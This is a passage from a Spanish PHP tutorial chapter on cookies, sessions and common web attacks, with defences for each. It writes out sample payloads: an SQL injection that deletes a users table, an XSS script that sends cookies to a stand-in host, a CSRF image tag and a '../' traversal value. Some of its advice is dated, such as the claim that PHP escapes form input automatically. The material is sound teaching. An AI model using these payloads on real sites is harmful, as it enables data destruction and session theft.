@@ -1,0 +1,1013 @@
+I"�J<h1 class="no_toc" id="3-cookies-sesiones-y-seguridad">3. Cookies, sesiones y seguridad</h1>
+
+<ul id="markdown-toc">
+  <li><a href="#31-cookies" id="markdown-toc-31-cookies">3.1. Cookies</a>    <ul>
+      <li><a href="#311-qué-son-las-cookies" id="markdown-toc-311-qué-son-las-cookies">3.1.1. ¿Qué son las cookies?</a></li>
+      <li><a href="#312-manejando-cookies-con-php" id="markdown-toc-312-manejando-cookies-con-php">3.1.2. Manejando cookies con PHP</a></li>
+    </ul>
+  </li>
+  <li><a href="#32-sesiones" id="markdown-toc-32-sesiones">3.2. Sesiones</a>    <ul>
+      <li><a href="#321-abrir-sesiones-session_start" id="markdown-toc-321-abrir-sesiones-session_start">3.2.1. Abrir sesiones: session_start()</a></li>
+      <li><a href="#322-usar-variables-de-sesión-_session" id="markdown-toc-322-usar-variables-de-sesión-_session">3.2.2. Usar variables de sesión: $_SESSION</a></li>
+      <li><a href="#323-eliminar-variables-de-sesión-unset-y-session_destroy" id="markdown-toc-323-eliminar-variables-de-sesión-unset-y-session_destroy">3.2.3. Eliminar variables de sesión: unset() y session_destroy()</a></li>
+    </ul>
+  </li>
+  <li><a href="#33-sesiones-cookies-y-control-de-acceso" id="markdown-toc-33-sesiones-cookies-y-control-de-acceso">3.3. Sesiones, cookies y control de acceso</a></li>
+  <li><a href="#34-técnicas-de-ataque-frecuentes" id="markdown-toc-34-técnicas-de-ataque-frecuentes">3.4. Técnicas de ataque frecuentes</a>    <ul>
+      <li><a href="#341-captura-de-id-de-sesión" id="markdown-toc-341-captura-de-id-de-sesión">3.4.1. Captura de ID de sesión</a></li>
+      <li><a href="#342-inyección-de-sql" id="markdown-toc-342-inyección-de-sql">3.4.2. Inyección de SQL</a></li>
+      <li><a href="#343-xss-cross-site-scripting" id="markdown-toc-343-xss-cross-site-scripting">3.4.3. XSS (cross site scripting)</a></li>
+      <li><a href="#344-csrf-o-xsrf-cross-site-request-forgery" id="markdown-toc-344-csrf-o-xsrf-cross-site-request-forgery">3.4.4. CSRF o XSRF (cross site request forgery)</a></li>
+      <li><a href="#345-dt-directory-transversal" id="markdown-toc-345-dt-directory-transversal">3.4.5. DT (directory transversal)</a></li>
+      <li><a href="#346-rfi-remote-file-inclusion" id="markdown-toc-346-rfi-remote-file-inclusion">3.4.6. RFI (remote file inclusion)</a></li>
+    </ul>
+  </li>
+  <li><a href="#35-caso-práctico-resuelto-autenticación-mediante-acl" id="markdown-toc-35-caso-práctico-resuelto-autenticación-mediante-acl">3.5. Caso práctico resuelto: autenticación mediante ACL</a>    <ul>
+      <li><a href="#351-qué-es-la-autenticación-mediante-acl" id="markdown-toc-351-qué-es-la-autenticación-mediante-acl">3.5.1. Qué es la autenticación mediante ACL</a></li>
+      <li><a href="#352-una-implementación-de-autenticación-mediante-acl" id="markdown-toc-352-una-implementación-de-autenticación-mediante-acl">3.5.2. Una implementación de autenticación mediante ACL</a></li>
+    </ul>
+  </li>
+  <li><a href="#36-ejercicios-propuestos" id="markdown-toc-36-ejercicios-propuestos">3.6. Ejercicios propuestos</a></li>
+</ul>
+
+<p>En este capítulo vamos a profundizar en varios aspectos de PHP de vital importancia para las aplicaciones web.</p>
+
+<p>Por un lado, tenemos las <strong><em>cookies</em></strong> y las <strong>sesiones</strong>, dos mecanismos que permiten a la aplicación mantener vivas algunas variables de forma indefinida.</p>
+
+<p>Después estudiaremos un problema endémico a las aplicaciones web: la <strong>seguridad</strong>. En efecto, al tratarse de aplicaciones que, por definición, están permanentemente conectadas a la red, son susceptibles de recibir ataques de manera continua e indiscriminada. Y, de hecho, lo hacen. Veremos cuáles son los tipos de ataque más frecuente y cómo podemos proteger nuestra aplicación contra ellos, algo en lo que juegan un papel importante las <em>cookies</em> y las variables de sesión.</p>
+
+<p>Por último, nos centraremos en algo muy relacionado con la seguridad: la autenticación de usuarios para acceder a la aplicación. La mayor parte de las aplicaciones web necesitan un mecanismo seguro de autenticación. Veremos en qué consisten las <strong>listas de control de acceso</strong> y plantearemos una implementación muy completa en la que pondremos en práctica todo lo que hemos aprendido hasta ahora e incluso iremos un paso más allá al introducir la arquitectura MVC, que veremos en el siguiente tema.</p>
+
+<h2 id="31-cookies">3.1. Cookies</h2>
+
+<h3 id="311-qué-son-las-cookies">3.1.1. ¿Qué son las cookies?</h3>
+
+<p>Las <strong><em>cookies</em></strong> son pequeños archivos de texto enviados desde el servidor que se almacenan en el lado del cliente. Es decir, en el navegador.</p>
+
+<p>Permiten guardar información de forma persistente, de manera que se mantenga entre una petición al servidor y otra. Una <em>cookie</em> puede estar viva durante minutos, horas, días o incluso indefinidamente.</p>
+
+<p>Desde PHP, se pueden usar las <em>cookies</em> usando la función <strong><em>setcookie()</em></strong> y el array global <strong><em>$_COOKIE</em></strong>. Vamos a ver cómo.</p>
+
+<h3 id="312-manejando-cookies-con-php">3.1.2. Manejando cookies con PHP</h3>
+
+<h4 id="enviar-una-cookie-setcookie">Enviar una cookie: setcookie()</h4>
+
+<p>Esta función define una <em>cookie</em> que se enviará al cliente junto con el resto de las cabeceras de HTTP. Devuelve <em>true</em> si la cookie se envía con éxito o <em>false</em> en caso contrario.</p>
+
+<p>Su sintaxis es:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bool</span> <span class="nb">setcookie</span> <span class="p">(</span> <span class="n">string</span> <span class="nv">$name</span> <span class="p">[,</span> <span class="n">string</span> <span class="nv">$value</span> <span class="p">[,</span> <span class="n">int</span> <span class="nv">$expire</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">[,</span> <span class="n">string</span> <span class="nv">$path</span> <span class="p">[,</span> <span class="n">string</span> <span class="nv">$domain</span> <span class="p">[,</span> <span class="n">bool</span> <span class="nv">$secure</span> <span class="o">=</span> <span class="kc">false</span> <span class="p">[,</span> <span class="n">bool</span> <span class="nv">$httponly</span> <span class="o">=</span> <span class="kc">false</span> <span class="p">]]]]]]</span> <span class="p">)</span>
+</code></pre></div></div>
+
+<p>Las <em>cookies</em> deben enviarse <strong>antes de que el programa genere ninguna salida</strong>. Esto no es un capricho de PHP, sino una restricción del protocolo http. Por lo tanto, debes llamar a esta función antes de hacer <em>cualquier</em> salida, incluidos espacios en blanco. En caso contrario, la <em>cookie</em> no estará disponible hasta que la página se recargue.</p>
+
+<p>La función <em>setcookie()</em> admite un montón de parámetros, la mayor parte de ellos optativos:</p>
+
+<ul>
+  <li><strong>name</strong>: El nombre de la <em>cookie</em>. Este es el único obligatorio.</li>
+  <li><strong>value</strong>: El valor de la <em>cookie</em>.</li>
+  <li><strong>expire</strong>: El tiempo que la <em>cookie</em> tardará en expirar. Se trata de una fecha expresada en <a href="https://es.wikipedia.org/wiki/Tiempo_Unix">formato Unix</a>.</li>
+  <li><strong>path</strong>: La ruta del servidor para la que la <em>cookie</em> estará disponible. Si se utiliza ‘/’, la <em>cookie</em> estará disponible en la totalidad del dominio.</li>
+  <li><strong>domain</strong>: El dominio para el cual la <em>cookie</em> está disponible.</li>
+  <li><strong>secure</strong>: Si la <em>cookie</em> solo debería enviarse en caso de conexión https, pon este argument a <em>true</em>.</li>
+  <li><strong>httponly</strong>: Esta <em>cookie</em> solo será accesible a través de http. Es decir, no podrá accederse a la <em>cookie</em> desde Javascript.</li>
+</ul>
+
+<p>Aquí tienes tres ejemplos de envío de la misma cookie:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+<span class="nv">$value</span> <span class="o">=</span> <span class="s2">"I'm your father"</span><span class="p">;</span> 
+
+<span class="nb">setcookie</span><span class="p">(</span><span class="s2">"VaderQuote"</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span> 
+<span class="nb">setcookie</span><span class="p">(</span><span class="s2">"VaderQuote"</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">);</span>  <span class="c1">// la cookie expira en una hora </span>
+<span class="nb">setcookie</span><span class="p">(</span><span class="s2">"VaderQuote"</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">,</span> <span class="s2">"/quotes/"</span><span class="p">,</span> <span class="s2">"bestquotes.com"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> 
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h4 id="recuperar-una-cookie-_cookies">Recuperar una cookie: $_COOKIES[]</h4>
+
+<p>Para ver el contenido de una <em>cookie</em>, simplemente hay que acceder al array global <em>$_COOKIES</em>. Por ejemplo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+<span class="c1">// Imprimir una cookie individual </span>
+<span class="k">echo</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"VaderQuote"</span><span class="p">];</span> 
+<span class="cp">?&gt;</span> 
+</code></pre></div></div>
+
+<h4 id="borrar-una-cookie">Borrar una cookie</h4>
+
+<p>Para forzar el borrado de una cookie en el cliente basta con enviarla con una fecha de expiración anterior a la fecha actual. Por ejemplo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+<span class="nb">setcookie</span> <span class="p">(</span><span class="s2">"VaderQuote"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">-</span> <span class="mi">3600</span><span class="p">);</span>  <span class="c1">// Establece la fecha de expiración una hora en el pasado</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h2 id="32-sesiones">3.2. Sesiones</h2>
+
+<p>Las sesiones en PHP habilitan un mecanismo para que un script almacene variables (llamadas <strong>variables de sesión</strong>) en el servidor de manera persistente, de modo que posteriores ejecuciones de programas en el servidor solicitadas desde el mismo cliente pueden acceder a esas variables.</p>
+
+<p>Es decir: en la práctica, <strong>las variables de sesión se comportan como si fueran variables globales a toda la aplicación web</strong>.</p>
+
+<p>Seguro que te habían dicho que usar variables globales es una mala idea y una pésima práctica de programación. Eso es cierto y, al mismo tiempo, usarlas resulta inevitable. <em>Bienvenido/a al extravagante mundo de las aplicaciones web</em>.</p>
+
+<p>Por ese motivo, debe reducirse el uso de las variables de sesión a lo estrictamente imprescindible. ¿Qué cosas resulta útil guardar en variables de sesión? Cosas como el ID o el nombre de un usuario logueado en un sistema o el estado de la aplicación. Poco más. Cosas pequeñas pero tremendamente importantes.</p>
+
+<p>Cada cliente tiene su propio espacio de variables de sesión en el servidor, de manera que no se mezclan unas con otras, ni un cliente puede acceder a las variables de otro cliente.</p>
+
+<p>La forma en la que PHP logra distinguir a los clientes entre sí es enviándoles, de forma transparente, una <em>cookie</em> con un valor aleatorio distinto para cada cliente. “De forma transparente” significa que ni el programador ni el usuario se enteran de que esa <em>cookie</em> existe: PHP se encarga de hacerlo por su cuenta.</p>
+
+<p>En el archivo <em>php.ini</em> se puede configurar la manera en la que PHP almacenará las variables de sesión (en memoria, en un fichero, etc), pero esto es irrelevante de cara a su funcionamiento y compete más al administrador del sistema que al programador. Lo que a nosotros nos interesa es aprender a crear variables de sesión, asignarles valor y recuperarlo posteriormente.</p>
+
+<h3 id="321-abrir-sesiones-session_start">3.2.1. Abrir sesiones: session_start()</h3>
+
+<p>Antes de acceder a cualquier variable de sesión (ya sea para crearla, para modificarla o para eliminarla) necesitamos indicarle a PHP que queremos usar variables de sesión en ese programa.</p>
+
+<p>La función <strong><em>session_start()</em></strong> se usa para eso: habilita el acceso a las variables de sesión, es decir, crea una nueva sesión o reanuda una sesión preexistente.</p>
+
+<p>Las sesiones admiten un nombre, por si necesitas crear sesiones separadas para el mismo cliente. No obstante, la mayor parte de las veces te bastará con crear sesiones sin nombre, sin necesidad de pasar ningún argumento a <em>session_start()</em>.</p>
+
+<h3 id="322-usar-variables-de-sesión-_session">3.2.2. Usar variables de sesión: $_SESSION</h3>
+
+<p>Las variables de sesión se manipulan a través del array superglobal <strong><em>$_SESSION</em></strong>.</p>
+
+<p>Si necesitas una variable de sesión llamada, por ejemplo, <em>nombre_usuario</em>, simplemente haz esto:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">session_start</span><span class="p">();</span>
+<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'nombre_usuario'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"valor-de-la-variable"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Por supuesto, el valor de esa posición del array $_SESSION puede consultarse o modificarse cuando lo necesitemos, porque se trata de un array como otro cualquiera… salvo que es <em>superglobal</em>, es decir, es accesible desde cualquier punto del programa.</p>
+
+<h3 id="323-eliminar-variables-de-sesión-unset-y-session_destroy">3.2.3. Eliminar variables de sesión: unset() y session_destroy()</h3>
+
+<p>La función <strong>unset()</strong> se utiliza para destruir cualquier variable, incluidas las de sesión:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'nombre_usuario'</span><span class="p">]);</span>
+</code></pre></div></div>
+
+<p>Si lo que deseas es destruir <em>todas</em> las variables de sesión, es preferible recurrir a <strong><em>session_destroy()</em></strong>.</p>
+
+<p>Ahora bien, session_destroy() destruye la información asociada a la sesión actual, pero no elimina realmente las variables de la memoria del servidor ni borra la <em>cookie</em> de sesión del cliente.</p>
+
+<p>Si eres un fanático de la seguridad y quieres asegurarte de destruir todas las variables de sesión, puedes usar la función <strong><em>session_unset()</em></strong>. Y, para borrar la cookie de sesión, debes usar <strong><em>setcookie()</em></strong>, como en este ejemplo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+
+<span class="c1">// Destruimos todas las variables de sesión (optativo)</span>
+<span class="nb">session_unset</span><span class="p">();</span>
+
+<span class="c1">// Si queremos destruir la sesión completamente, borramos también la cookie de sesión.</span>
+<span class="nv">$params</span> <span class="o">=</span> <span class="nb">session_get_cookie_params</span><span class="p">();</span>
+<span class="nb">setcookie</span><span class="p">(</span><span class="nb">session_name</span><span class="p">(),</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">-</span> <span class="mi">42000</span><span class="p">,</span>
+        <span class="nv">$params</span><span class="p">[</span><span class="s2">"path"</span><span class="p">],</span> <span class="nv">$params</span><span class="p">[</span><span class="s2">"domain"</span><span class="p">],</span>
+        <span class="nv">$params</span><span class="p">[</span><span class="s2">"secure"</span><span class="p">],</span> <span class="nv">$params</span><span class="p">[</span><span class="s2">"httponly"</span><span class="p">]</span>
+<span class="p">);</span>
+
+<span class="c1">// Finalmente, cerramos 0la sesión</span>
+<span class="nb">session_destroy</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h2 id="33-sesiones-cookies-y-control-de-acceso">3.3. Sesiones, cookies y control de acceso</h2>
+
+<p><em>Cookies</em> y variables de sesión se usan a menudo, por separado o de forma combinada, para controlar el acceso a una aplicación web.</p>
+
+<p>En este punto conviene que te hagas esta pregunta: ¿qué significa “loguearse” en una aplicación?</p>
+
+<p>Piénsalo un momento. ¿Qué significa eso <em>realmente</em>?</p>
+
+<p>Por supuesto, implica superar un formulario donde se nos pregunta nuestro nombre de usuario (o nuestro email, o alguna otra identificación) y una contraseña. Pero, si lo superamos, ¿qué sucede entonces?</p>
+
+<p><strong>Autenticarse o “loguearse” en una aplicación significa que esa aplicación <em>cambia de estado</em> y pasa a reconocernos como usuarios registrados</strong>. <em>Algo</em> tiene que cambiar dentro de la aplicación, porque a partir de ese momento, y solo para nosotros, se comportará de un modo distinto.</p>
+
+<p>Ese “algo” implica que la aplicación recordará quiénes somos nosotros y cuales son nuestros privilegios en la aplicación hasta que cerremos la sesión. Y sobre nosotros puede recordar muchas cosas: el nombre, los apellidos, nuestra foto de perfil… Pero, sobre todas esas cosas, hay una fundamental: nuestro ID de usuario.</p>
+
+<p>Todos los usuarios registrados tienen un ID en todos los sistemas. A la aplicación le basta con conocer nuestro ID para recordar quiénes somos.</p>
+
+<p>¿Y cómo “recuerda” una aplicación web un dato como ese? Muy fácil: almacenándolo en una <em>cookie</em> o en una variable de sesión, que son persistentes hasta que el programa decide destruirlas. Es decir, cuando el usuario abandona la aplicación, el programa debe destruir la <em>cookie</em> o destruir la sesión.</p>
+
+<p>Justo en este momento hay una cosa que tiene que quedarte muy clara: <strong>¡ninguno de estos métodos es completamente seguro!</strong>.</p>
+
+<p>Las <em>cookies</em> pueden rastrearse o modificarse en el ordenador del cliente. Además, algunos clientes las tienen desactivadas. ¡No te puedes fiar de ellas!</p>
+
+<p>Las variables de sesión, en principio más seguras, pueden ser atacadas capturando el ID de sesión, como veremos más adelante.</p>
+
+<p>El método más seguro, y el más complicado de programar, es el que combina:</p>
+
+<ul>
+  <li>Cookies y/o variables de sesión.</li>
+  <li>Variables guardadas en una tabla de la BD.</li>
+</ul>
+
+<p>El uso de <em>frameworks</em> solventes (como Laravel, que estudiaremos más adelante) hace innecesario tomarse este trabajo, puesto que todos habilitan un mecanismo de sesiones seguras que mejora notablemente las prestaciones de las sesiones nativas de PHP.</p>
+
+<p>No obstante, en las actividades resueltas y propuestas del final del tema plantearemos una solución para la autenticación de usuarios desarrollada por nosotros mismos y que resultará razonablemente segura.</p>
+
+<h2 id="34-técnicas-de-ataque-frecuentes">3.4. Técnicas de ataque frecuentes</h2>
+
+<p>(Esta sección está adaptada de <a href="securitybydefault.com">securitybydefault.com</a>)</p>
+
+<p>Cualquier aplicación web, por el mero hecho de estar abierta a recibir información procedente de la red, es susceptible de ser atacada. Y te aseguro que, antes o después, cualquier aplicación que esté <em>online</em> acaba por ser atacada. Es una certeza matemática.</p>
+
+<p>En esta sección vamos a describir qué tipos de ataque son los más frecuentes.</p>
+
+<p>Aunque proporcionaremos algunas estrategias de defensa (que debes tener en cuenta en tus desarrollos), hay una idea común a todas: lo más seguro es utilizar un <em>framework</em> como Laravel, Symfony o Zend, debidamente actualizado. Los mecanismos de seguridad que implementan estos frameworks son suficientes para la mayor parte de los casos y se mejoran cada vez que se descubre una vulnerabilidad.</p>
+
+<p>Aún así, conviene que conozcas con qué tipos de ataque te vas a encontrar y cuales son las formas de defenderse de ellos.</p>
+
+<h3 id="341-captura-de-id-de-sesión">3.4.1. Captura de ID de sesión</h3>
+
+<p>Como ya hemos visto, el ID de una sesión se guarda como una <em>cookie</em> (llamada generalmente <em>phpsessid</em>) en el cliente para distinguir a ese cliente de otros a la hora de acceder a las variables de sesión. Por lo tanto, viaja en el paquete http desde el servidor hasta el cliente.</p>
+
+<p>Un atacante que esté escuchando en esa red puede <strong>leer la cookie con el ID de sesión del paquete http</strong> y, de ese modo, <strong>suplantar la identidad</strong> de la persona que inició la sesión. También puede inyectar Javascript a su víctima para capturar de ese modo el ID de sesión, con idénticos resultados.</p>
+
+<p>Por último, si el atacante consigue tener acceso, aunque sea por unos minutos, al ordenador de su víctima, puede robar el ID de sesión (que en el cliente siempre se almacena como texto plano) y suplantarlo con toda comodidad.</p>
+
+<p>Soluciones:</p>
+
+<ul>
+  <li>Combinar las variables de sesión con <em>cookies</em> o con entradas en la base de datos.</li>
+  <li>Cambiar el ID de sesión periódicamente.</li>
+  <li>No confiar en variables de sesión de PHP para almacenar información muy sensible.</li>
+  <li>Denegar el acceso a la <em>cookie</em> de sesión desde Javascript (usando el atributo <em>httponly</em>).</li>
+  <li>Acceder solo a webs que usen https, no http. De ese modo, la cookie de sesión viaja encriptada hasta el navegador. Este es uno de los muchos motivos por los que https se ha impuesto definitivamente a lo largo y ancho de la web.</li>
+</ul>
+
+<h3 id="342-inyección-de-sql">3.4.2. Inyección de SQL</h3>
+
+<p>Este ataque consiste en que <strong>un usuario malintencionado ejecuta sentencias SQL contra la base de datos</strong> del sitio web mediante el simple procedimiento de insertarlas en un formulario.</p>
+
+<p>¿Qué cómo narices se hace eso? Te lo explico con un ejemplo. Imagina que nuestro atacante ha hecho la suposición de que nuestra tabla de usuarios se llama <em>users</em> (una suposición muy razonable). Entonces, el tío, o la tía, llega al formulario de login de la aplicación, donde se nos pide el <em>nick</em> y la contraseña, y escribe esto en el campo <em>nick</em>:</p>
+
+<p><img src="/docs/dwes/_site/assets/images/03-formulario-inyeccion-sql.png" alt="Ataque por inyección SQL" /></p>
+
+<p>Cuando pulse el botón <em>“Sign in”</em> ocurrirá algo muy curioso… y muy desagradable. Dentro de nuestro código fuente, seguramente tendremos una línea parecida a esta:</p>
+
+<p><code>
+$sql = "SELECT * FROM users WHERE nick = '$nick' and passwd = '$pass'";
+</code></p>
+
+<p>Fíjate otra vez en lo que el atacante ha escrito en el campo <em>nick</em> del formulario de login. Eso significa que la variable <em>$nick</em> tendrá este contenido: <code class="language-plaintext highlighter-rouge">nada'; DELETE * FROM users; #</code>. Imagina lo que va a suceder cuando esa variable se expanda dentro de la sentencia SQL anterior.</p>
+
+<p>¿Te lo has imaginado ya?</p>
+
+<p>Por si acaso aún no lo has pillado, te lo chivo. Lo que sucederá es que, al expandir la variable <em>$nick</em> en ese string, la variable <em>$sql</em> pasará a tener este valor:</p>
+
+<p><code>
+SELECT * FROM users WHERE nick ='<strong>nada';
+DELETE * FROM users;
+#</strong>'and passwd = '$pass'
+</code></p>
+
+<p>(He puesto en negrita el contenido de la variable <em>$nick</em> expandido dentro del string <em>$sql</em>)</p>
+
+<p>Es decir, que el atacante ha logrado convertir un inofensivo <em>SELECT</em> en una secuencia de dos instrucciones. Y una de ellas no es nada inofensiva.</p>
+
+<p>En efecto, cuando pidamos a la base de datos que ejecute ese SQL, las sentencias se ejecutarán en orden. El primer SELECT no devolverá ningún resultado, pero es sintácticamente correcto y, en cualquier caso, al atacante no le interesan esos resultados.</p>
+
+<p>Como el SELECT es sintácticamente correcto, la base de datos no se detendrá ahí, sino que seguirá ejecutando las sentencias. Y le llegará el turno al DELETE. ¡Bingo! El simpático atacante acaba de cepillarse nuestra tabla de usuarios.</p>
+
+<p>(Lo que haya a continuación del símbolo # se ignorará, porque ese es el símbolo de comentario en SQL).</p>
+
+<p>El atacante no solo puede ejecutar un DELETE mediante este sencillo procedimiento, sino que puede llevar a cabo otras acciones destructivas (¿qué tal un DROP DATABASE?) o instrusivas (puede intentar insertar un usuario administrador fraudulento en la tabla <em>users</em>, por ejemplo). Y todo ello partiendo de una suposición bastante plausible: que la tabla de usuarios se llama <em>users</em>.</p>
+
+<p>Para blindarse frente a inyecciones de SQL, se recomienda:</p>
+
+<ul>
+  <li><strong>Filtrar los datos procedentes de los formularios. SIEMPRE</strong>. Por ejemplo, si los nombres de usuario sólo pueden estar compuestos por letras y números, no se deben permitir caracteres como comillas, puntos y coma, asteriscos, almohadillas, etc.</li>
+  <li><strong>Escapar los caracteres especiales</strong> de cualquier dato de entrada antes de enviarlo al gestor de bases de datos. Por ejemplo, <em>mysql_real_escape_string()</em> coloca barras invertidas antes de ciertos caracteres. <em>addslashes()</em> hace algo parecido. Esto hace que ya no se ejecuten como sentencias SQL. En las versiones recientes de PHP, el escape de caracteres especiales se hace automáticamente con cualquier dato que llegue por GET o POST.</li>
+  <li><strong>Usar nombres poco habituales para las tablas</strong> de la base de datos. Una estrategia frecuente es utilizar un identificador significativo (como <em>users</em> para la tabla de usuarios) y añadirle varios caracteres o números aleatorios (así, la tabla se convertiría en algo como <em>users_58283</em>). Ese sufijo aleatorio se suele almacenar en un archivo de configuración para que esté accesible para todos los scripts del programa. Esta técnica tan simple dificulta enormemente cualquier intento de acceso fraudulento a las tablas.</li>
+</ul>
+
+<h3 id="343-xss-cross-site-scripting">3.4.3. XSS (cross site scripting)</h3>
+
+<p>El ataque por XSS consiste en <strong>ejecutar código de scripting malicioso</strong> (básicamente, Javascript) en el contexto del sitio web.</p>
+
+<p>Hay muchas formas de hacer XSS. Por ejemplo, imagínate que tenemos un blog de noticias y que un usuario malicioso publica, <em>como parte del texto de una entrada</em>, este string:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://otrositio.com</span><span class="dl">'</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>¿Qué ocurriría? Pues que cada vez que alguien visite nuestro portal y cargue esa noticia, será redirigido a <em>otrositio.com</em>, donde probablemente pretenderán venderle medicamentos para la disfunción eréctil o algo por el estilo.</p>
+
+<p>Otra cosa que suele hacerse con XSS es robar datos de las <em>cookies</em> del cliente, aprovechando que Javascript puede acceder a las <em>cookies</em>. Para ello, el atacante solo tiene que inyectar un código como este:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://otrositio.com?cookies=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>Para evitar los ataques XSS, la estrategia más útil, otra vez, es <strong>filtrar todos los datos externos</strong>. El filtrado de datos es sencillo de hacer y te ahorrará mogollón de problemas. En resumen: <strong>nunca</strong> te fíes de ningún dato que provenga de un formulario si no lo has filtrado antes y le has quitado todos los caracteres sospechosos.</p>
+
+<h3 id="344-csrf-o-xsrf-cross-site-request-forgery">3.4.4. CSRF o XSRF (cross site request forgery)</h3>
+
+<p>Este tipo de ataques <strong>explota la confianza que tiene un sitio web en la identidad de un usuario</strong>. Es decir, se toma a un usuario válido registrado en un sitio (por ejemplo, sitio-confiable.com) y, desde otro sitio (por ejemplo, sitio-maligno.com), se le fuerza a hacer algo chungo en sitio-confiable.com.</p>
+
+<p>Veámoslo con un ejemplo. Supón que eres un usuario administrador en sitio-confiable.com. Para borrar a un usuario de tu web (o cualquier otro recurso), lanzas una URL como https://sitio-confiable.com/usuario/delete/28 (donde 28 es el id del usuario). Este tipo de URLs son muy habituales en las aplicaciones web.</p>
+
+<p>Pues bien, imagina que has abierto una sesión como administrador en sitio-confiable.com y, sin cerrarla, navegas por otra web llamada sitio-maligno.com. Y un atacante supermalvado, conocedor de tu propensión a navegar por sitios chungos sin cerrar la sesión en sitio-confiable.com, ha colocado este código como parte del código fuente de sitio-maligno.com:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'https://sitio-confiable.com/usuario/delete/28'</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>Cuando tu navegador cargue esa página, lanzará una petición GET a sitio-confiable.com, resultando en la eliminación del usuario 28 sin que tú te enteres de cómo ha podido suceder semejante desgracia.</p>
+
+<p>Esto es solo un ejemplo. Por supuesto, el atacante puede hacer un montón de cosas desagradables en sitio-confiable.com, porque ese sitio está confiando en ti, que eres un usuario legítimo con una sesión abierta.</p>
+
+<p>Puedes pensar: ¿y quién demonios se va a dejar una sesión abierta y se va a poner a navegar por otros sitios sin cerrarla? Respuesta: <em>todo</em> el mundo. Si tú no lo has hecho nunca, aunque solo haya sido una vez, probablemente no perteneces a la especie humana.</p>
+
+<p>Algunas técnicas para dificultar el ataque por CSRF:</p>
+
+<ul>
+  <li><strong>Utilizar POST en lugar de GET</strong> para recibir datos.</li>
+  <li><strong>Generar tokens únicos para cada petición</strong>. Un tóken es una cadena alfanumérica aleatoria generada por el servidor cuando sirve el código HTML de un formulario. El cliente debe enviar de vuelta ese tóken junto con los datos del formulario para que el servidor acepte la petición como válida. Si un atacante intenta efectuar un ataque CSRF, enviará sus peticiones sin el tóken y serán rechazadas.</li>
+</ul>
+
+<h3 id="345-dt-directory-transversal">3.4.5. DT (directory transversal)</h3>
+
+<p>Este ataque se produce cuando el atacante logra <strong>acceder a ficheros del servidor que están fuera del directorio de la aplicación</strong> y que, teóricamente, no deberían ser accesibles desde esta.</p>
+
+<p>Es fácil comprender cómo puede montarse un ataque así. Imagina un programa PHP que haga un <em>include()</em> de este estilo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">include</span> <span class="p">(</span><span class="s2">"views/"</span> <span class="mf">.</span> <span class="nv">$viewName</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Si un atacante logra manipular la variable <em>$viewName</em> para asignarle, por ejemplo, el valor “../../../../otro-fichero.php”, nuestro programa hará un include de un fichero que está claramente fuera de los directorios de la aplicación.</p>
+
+<p>Para evitar este tipo de ataques, algunas estrategias son:</p>
+
+<ul>
+  <li><strong>Tener un array de páginas y carpetas válidas</strong>. Si un include trata de acceder a un recurso que no está en la lista, se sospechará de un ataque.</li>
+  <li><strong>Buscar caracteres sospechosos en los nombres de los archivos</strong>. Si la variable <em>$viewName</em> del ejemplo anterior incluye los caracteres “../”, la cosa se pone fea. No en vano, el ataque Directory Transversal también se denomina “ataque punto punto barra”.</li>
+</ul>
+
+<h3 id="346-rfi-remote-file-inclusion">3.4.6. RFI (remote file inclusion)</h3>
+
+<p>Este ataque se produce cuando <strong>se incluye un archivo remoto</strong> explotando una vulnerabilidad del código fuente.</p>
+
